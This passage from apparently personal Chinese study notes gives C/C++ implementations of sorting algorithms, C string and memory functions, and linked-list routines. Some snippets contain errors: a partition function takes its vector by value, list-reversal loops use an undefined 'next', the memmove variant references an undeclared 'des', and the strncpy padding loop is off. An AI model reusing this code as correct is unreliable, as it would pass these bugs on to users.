src="C:\Users\zx\AppData\Roaming\Typora\typora-user-images\image-20210725151825630.png" alt="image-20210725151825630"></p><p><img src="C:\Users\zx\AppData\Roaming\Typora\typora-user-images\image-20210725155221427.png" alt="image-20210725155221427"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">二路归并快速排序</span><br><span class="line">int partition(vector&lt;int&gt; tem,int l,int r)</span><br><span class="line">&#123;</span><br><span class="line">int j=l;</span><br><span class="line">int num=tem[l];</span><br><span class="line">for(int i=l+1;i&lt;=r;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(tem[i]&lt;num)</span><br><span class="line">&#123;</span><br><span class="line">swap(tem[++j],tem[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">swap(tem[l],tem[j]);</span><br><span class="line">return j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">int partition(vector&lt;int&gt; tem,int l,int r)</span><br><span class="line">&#123;</span><br><span class="line">int j=l+1;</span><br><span class="line">int num=tem[l];</span><br><span class="line">for(int i=l+1;i&lt;=r;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(tem[i]&lt;num)</span><br><span class="line">&#123;</span><br><span class="line">swap(tem[j++],tem[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">swap(tem[l],tem[j-1]);</span><br><span class="line">return j-1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void quicksort(vector&lt;int&gt;&amp; tem,int l,int r)</span><br><span class="line">&#123;</span><br><span class="line">if(l&gt;=r)return;</span><br><span class="line">int pivot=partition(tem,l,r);</span><br><span class="line">quicksort(tem,l,pivot-1);</span><br><span class="line">quicksort(tem,pivot+1,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="荷兰国旗-三路快排"><a href="#荷兰国旗-三路快排" class="headerlink" title="荷兰国旗(三路快排)"></a>荷兰国旗(三路快排)</h2><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210908215449920.png" alt="image-20210908215449920"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//[0,zero]为0</span><br><span class="line">//(zero,i)为1</span><br><span class="line">//[two,nums.size()-1]为2</span><br><span class="line">    void sortColors(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        int zero=-1;</span><br><span class="line">        int i=0;</span><br><span class="line">        int two=nums.size();</span><br><span class="line">        while(i&lt;two)</span><br><span class="line">        &#123;</span><br><span class="line">            if(nums[i]==0)</span><br><span class="line">            &#123;</span><br><span class="line">                swap(nums[++zero],nums[i++]);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nums[i]==1)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nums[i]==2)</span><br><span class="line">            &#123;</span><br><span class="line">                swap(nums[--two],nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">void mergeSortCore(vector&lt;int&gt;&amp; data, vector&lt;int&gt;&amp; dataTemp, int low, int high) &#123;</span><br><span class="line">    if (low &gt;= high) return;</span><br><span class="line">    int len = high - low, mid = low + len / 2;</span><br><span class="line">    int start1 = low, end1 = mid, start2 = mid + 1, end2 = high;</span><br><span class="line">    mergeSortCore(data, dataTemp, start1, end1);</span><br><span class="line">    mergeSortCore(data, dataTemp, start2, end2);</span><br><span class="line">    int index = low;</span><br><span class="line">    while (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2) &#123;</span><br><span class="line">        dataTemp[index++] = data[start1] &lt; data[start2] ? data[start1++] :data[start2++];</span><br><span class="line">    &#125;</span><br><span class="line">    while (start1 &lt;= end1) &#123;</span><br><span class="line">        dataTemp[index++] = data[start1++];</span><br><span class="line">    &#125;</span><br><span class="line">    while (start2 &lt;= end2) &#123;</span><br><span class="line">    dataTemp[index++] = data[start2++];</span><br><span class="line">    &#125;</span><br><span class="line">    for (index = low; index &lt;= high; ++index) &#123;</span><br><span class="line">   data[index] = dataTemp[index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void mergeSort(vector&lt;int&gt;&amp; data) &#123;</span><br><span class="line">    int len = data.size();</span><br><span class="line">    vector&lt;int&gt; dataTemp(len, 0);</span><br><span class="line">    mergeSortCore(data, dataTemp, 0, len - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">堆：必须是完全二叉树,子节点大于父节点</span><br><span class="line">节点从0开始编号，父节点i,左孩子2i+1,右孩子2i+2    父亲i-1/2 第一个非叶子节点 size-2/2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//对当前节点形成的树进行堆化处理，有递归调用</span><br><span class="line">void heapify(vector&lt;int&gt;&amp; vec,int length,int i)</span><br><span class="line">&#123;</span><br><span class="line">    //对当前i节点进行shifdown操作</span><br><span class="line">    //保存当前值</span><br><span class="line">    int max=i;</span><br><span class="line">    int l=2*i+1;</span><br><span class="line">    int r=2*i+2;</span><br><span class="line">    if(l&lt;length&amp;&amp;vec[l]&gt;vec[max])</span><br><span class="line">    &#123;</span><br><span class="line">        max=l;</span><br><span class="line">    &#125;</span><br><span class="line">    if(r&lt;length&amp;&amp;vec[r]&gt;vec[max])</span><br><span class="line">    &#123;</span><br><span class="line">        max=r;</span><br><span class="line">    &#125;</span><br><span class="line">    if(max!=i)</span><br><span class="line">    &#123;</span><br><span class="line">        swap(vec[i],vec[max]);</span><br><span class="line">        heapify(vec,length,max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//将一个无序数组堆排序</span><br><span class="line">void heapSort(vector&lt;int&gt;&amp; vec)</span><br><span class="line">&#123;</span><br><span class="line">    int size=vec.size();</span><br><span class="line">    //建堆</span><br><span class="line">    //从第一个非叶子节点进行heapify</span><br><span class="line">    for(int i=(size-2)/2;i&gt;=0;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        heapify(vec,size,i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //堆排序</span><br><span class="line">    for(int i=size-1;i&gt;=0;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        //交换堆顶元素和最后一个元素，除了vec[0]不满足堆的性质，其他均满足</span><br><span class="line">        swap(vec[0],vec[i]);</span><br><span class="line">        //交换后长度-1维护vec[0]的堆,只需要维护堆顶的性质</span><br><span class="line">        heapify(vec,i,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; vec=&#123;20,6,9,1,4,10,8&#125;;</span><br><span class="line">    heapSort(vec);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="求前k大的数"><a href="#求前k大的数" class="headerlink" title="求前k大的数"></a>求前k大的数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">利用快排</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">int partition(vector&lt;int&gt;&amp; arr,int start,int end)</span><br><span class="line">&#123;</span><br><span class="line">    int temp=arr[start];</span><br><span class="line">    int j=start+1;</span><br><span class="line">    for(int i=start+1;i&lt;=end;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(arr[i]&lt;=temp)</span><br><span class="line">        &#123;</span><br><span class="line">            swap(arr[j],arr[i]);</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(arr[j-1],arr[start]);</span><br><span class="line">    return j-1;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;int&gt; quicksort(vector&lt;int&gt;&amp; arr, int k,int l,int r)</span><br><span class="line">&#123;</span><br><span class="line">    int pivot=partition(arr,l,r);</span><br><span class="line">    if(pivot==k-1)</span><br><span class="line">    &#123;</span><br><span class="line">        return vector&lt;int&gt;(arr.begin(),arr.begin()+k);</span><br><span class="line">    &#125;</span><br><span class="line">    return pivot&gt;k-1?quicksort(arr,k,l,pivot-1):quicksort(arr,k,pivot+1,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; getLeastNumbers(vector&lt;int&gt;&amp; arr, int k) &#123;</span><br><span class="line">        if(k==0||arr.size()==0)</span><br><span class="line">            return vector&lt;int&gt;();</span><br><span class="line">        return quicksort(arr,k,0,arr.size()-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">2.利用堆排</span><br></pre></td></tr></table></figure><h2 id="求第k大的元素"><a href="#求第k大的元素" class="headerlink" title="求第k大的元素"></a>求第k大的元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">堆排序</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    void heapify(vector&lt;int&gt;&amp; arr,int i,int length)</span><br><span class="line">    &#123;</span><br><span class="line">        int tmp=arr[i];</span><br><span class="line">        int max=i;</span><br><span class="line">        int k=2*i+1;</span><br><span class="line">        if(k&lt;length&amp;&amp;arr[k]&gt;arr[max])</span><br><span class="line">        &#123;</span><br><span class="line">            max=k;</span><br><span class="line">        &#125;</span><br><span class="line">        if(k+1&lt;length&amp;&amp;arr[k+1]&gt;arr[max])</span><br><span class="line">        &#123;</span><br><span class="line">            max=k+1;</span><br><span class="line">        &#125;</span><br><span class="line">        if(max!=i)</span><br><span class="line">        &#123;</span><br><span class="line">            swap(arr[i],arr[max]);</span><br><span class="line">            heapify(arr,max,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    void makeheap(vector&lt;int&gt;&amp; nums,int length)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=(length-2)/2;i&gt;=0;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            heapify(nums,i,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int findKthLargest(vector&lt;int&gt;&amp; nums, int k) &#123;</span><br><span class="line">        makeheap(nums,nums.size());</span><br><span class="line">        for(int i=nums.size()-1;i&gt;nums.size()-k;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            swap(nums[0],nums[i]);</span><br><span class="line">            heapify(nums,0,i);</span><br><span class="line">        &#125;</span><br><span class="line">        return nums[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="strcpy和strncpy"><a href="#strcpy和strncpy" class="headerlink" title="strcpy和strncpy"></a>strcpy和strncpy</h2><p>strcpy:注意检查指针有效性</p><p>​            不管des内存够不够，一直拷贝到’\0’结束，所以一般为了避免溢出，des长度要足以装下src+’\0’</p><p>​            des的内存也不应该与src重叠</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">strcpy:</span><br><span class="line"></span><br><span class="line">char *strcpy(char *des, const char *src)  </span><br><span class="line">&#123;   </span><br><span class="line">    assert((des!=NULL) &amp;&amp; (src !=NULL));   </span><br><span class="line">    char *ans = des;                    </span><br><span class="line">    while( (*des++ = * src++) != &#x27;\0&#x27; );      </span><br><span class="line">    return ans;                            </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy:"></a>strncpy:</h2><p>​            当src长度小于n时，拷贝src到des，多余补’\0’</p><p>​            当src长度大于n时，拷贝src前n个字节进des，此时des不是以’\0’为结尾的字符串，不安全</p><p>​            src和des不能重叠</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">strncpy:</span><br><span class="line"></span><br><span class="line">char* strncpy(char* des,const char* src,size_t n)</span><br><span class="line">&#123;</span><br><span class="line">char* ans=des;</span><br><span class="line">while(n&amp;&amp;(*des++ = * src++)!= &#x27;\0&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line">while(--n)</span><br><span class="line">&#123;</span><br><span class="line">*des++=&#x27;\0&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="memcpy和memmove"><a href="#memcpy和memmove" class="headerlink" title="memcpy和memmove"></a>memcpy和memmove</h2><p>memmove是内存重叠版本的memcpy</p><p>memmove</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void *memcpy(void *dest, const void *src,size_t n)</span><br><span class="line">&#123;</span><br><span class="line">    if(dest==nullptr||src==nullptr)</span><br><span class="line">        return nullptr;</span><br><span class="line">    char* d=(char *)des;</span><br><span class="line">    char* s=(char *)src;</span><br><span class="line">    void* res=d;</span><br><span class="line">    if(d&lt;=s||d&gt;=s+n)&#123;</span><br><span class="line">        while(n--)&#123;</span><br><span class="line">        //从低地址开始复制</span><br><span class="line">        *d++ =*s++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    //从高地址开始复制</span><br><span class="line">          while(n--)&#123;</span><br><span class="line">          *(d+n-1)=*(s+n-1);</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h2><p>​    比较两个c字符串，相等返回0，不相等时第一个字典序大返回1，第二个字典序大返回-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int strcmp(const char *dest, const char *source) </span><br><span class="line">&#123; </span><br><span class="line">  assert((NULL != dest) &amp;&amp; (NULL != source)); </span><br><span class="line">  while (*dest &amp;&amp; *source &amp;&amp; (*dest == *source)) </span><br><span class="line">      &#123; </span><br><span class="line">          dest ++; </span><br><span class="line">          source ++; </span><br><span class="line">      &#125; </span><br><span class="line">  return *dest - *source; </span><br><span class="line">/*如果dest &gt; source,则返回值大于0，如果dest = source,则返回值等于0，如果dest &lt; source ,则返回值小于0。*/ </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h2><p>kmp或者暴力搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-链表"><a href="#2-链表" class="headerlink" title="2.链表"></a>2.链表</h1><h2 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1.双指针</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* reverseList(ListNode* head) &#123;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        ListNode* pre=nullptr;</span><br><span class="line">        ListNode* nx;</span><br><span class="line">        while (cur) &#123;</span><br><span class="line">        nx=cur-&gt;next;</span><br><span class="line">        cur-&gt;next=pre;</span><br><span class="line">        pre=cur;</span><br><span class="line">        cur=next;</span><br><span class="line">        &#125;</span><br><span class="line">        return pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">2.递归</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* reverseList(ListNode* head) &#123;</span><br><span class="line">        if (head == NULL || head-&gt;next == NULL) &#123;</span><br><span class="line">            return head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode*ret= reverseList(head-&gt;next);</span><br><span class="line">        head-&gt;next-&gt;next = head;  </span><br><span class="line">        head-&gt;next = NULL;</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">3.反转[head,tail）之间的链表</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* reverseList(ListNode* head,ListNode* tail) &#123;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        ListNode* pre=nullptr;</span><br><span class="line">        ListNode* nx;</span><br><span class="line">        while (cur!=tail) &#123;</span><br><span class="line">        nx=cur-&gt;next;</span><br><span class="line">        cur-&gt;next=pre;</span><br><span class="line">        pre=cur;</span><br><span class="line">        cur=next;</span><br><span class="line">        &#125;</span><br><span class="line">        return pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">4.k个一组反转链表</span><br><span class="line"></span><br><span class="line">ListNode reverseKGroup(ListNode head, int k) &#123;</span><br><span class="line">    if (head == null) return null;</span><br><span class="line">    ListNode a, b;</span><br><span class="line">    a = b = head;</span><br><span class="line">    for (int i = 0; i &lt; k; i++) &#123;</span><br><span class="line">        if (b == null) return head;</span><br><span class="line">        b = b.next;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode newHead = reverse(a, b);</span><br><span class="line">    a.next = reverseKGroup(b, k);</span><br><span class="line">    return newHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="判断链表是否相等"><a href="#判断链表是否相等" class="headerlink" title="判断链表是否相等"></a>判断链表是否相等</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bool isSame(ListNode* head1, ListNode* head2) &#123;</span><br><span class="line">    while (head1 &amp;&amp; head2) &#123;</span><br><span class="line">    if (head1-&gt;val != head2-&gt;val) return false;</span><br><span class="line">        head1 = head1-&gt;next;</span><br><span class="line">        head2 = head2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    return !head1 &amp;&amp; !head2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="找链表的中点"><a href="#找链表的中点" class="headerlink" title="找链表的中点"></a>找链表的中点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//当使用fast&amp;&amp;fast-&gt;next作为判断条件，slow在中间或者中间偏右</span><br><span class="line">//当使用fast-&gt;next&amp;&amp;fast-&gt;next-&gt;next作为判断条件，slow在中间或者偏左的位置(常用)</span><br><span class="line">ListNode* getMiddle(ListNode head) &#123;</span><br><span class="line">    ListNode* fast=head;</span><br><span class="line">    ListNode* slow=head;</span><br><span class="line">    while(fast&amp;&amp;fast-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">    slow=slow-&gt;next;</span><br><span class="line">    fast=fast-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    return slow;</span><br><span class="line">    //奇数slow正好在中间，偶数slow在中间右边</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="链表交点"><a href="#链表交点" class="headerlink" title="链表交点"></a>链表交点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) &#123;</span><br><span class="line">        ListNode* tem1=headA;</span><br><span class="line">        ListNode* tem2=headB;</span><br><span class="line">        while(tem1!=tem2)</span><br><span class="line">        &#123;</span><br><span class="line">            tem1=tem1==nullptr?headB:tem1-&gt;next;</span><br><span class="line">            tem2=tem2==nullptr?headA:tem2-&gt;next;</span><br><span class="line">        &#125; </span><br><span class="line">        return tem1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="链表环的交点"><a href="#链表环的交点" class="headerlink" title="链表环的交点"></a>链表环的交点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">fast、slow指向head</span><br><span class="line">while(fast&amp;&amp;fast-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">fast=fast-&gt;next-&gt;next;</span><br><span class="line">slow=slow-&gt;next;</span><br><span class="line">//没有交点进不来的</span><br><span class="line">if(slow==fast)</span><br><span class="line">&#123;</span><br><span class="line">fast=head;</span><br><span class="line">while(fast!=slow)</span><br><span class="line">&#123;</span><br><span class="line">fast=fast-&gt;next;</span><br><span class="line">slow=slow-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">return fast;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nullptr;</span><br></pre></td></tr></table></figure><h2 id="合并升序链表"><a href="#合并升序链表" class="headerlink" title="合并升序链表"></a>合并升序链表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 